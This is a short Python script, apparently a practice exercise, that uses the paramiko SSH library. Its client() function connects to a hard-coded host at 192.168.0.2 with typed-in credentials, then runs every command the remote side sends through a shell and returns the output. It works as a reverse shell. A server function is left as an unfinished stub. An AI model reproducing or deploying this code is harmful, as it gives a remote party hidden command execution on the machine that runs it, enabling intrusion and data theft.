import paramiko
import threading
import subprocess

def run_command(ip, user, passwd, command, host_keys=False):
    client = paramiko.SSHClient()
    if host_keys:
        client.load_host_keys(host_keys)

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if(ssh_session.active):
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024))
    return

def client(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if(ssh_session.active):
        ssh_session.send(command)
        print(ssh_session.recv(1024)) # Read banner
        while(True):
            # Get command from SSH server
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))

def server():
    host_keys = paramiko.RSAKey(filename="test_rsa.key")
    

# run_command("192.168.0.2", input("Enter Username: "), input("Enter Password: "), input("Enter Command: "))
client("192.168.0.2", input("Enter Username: "), input("Enter Password: "), input("Enter Command: "))
# client("192.168.0.2", input("Enter Username: "), input("Enter Password: "), input("Enter Command: "))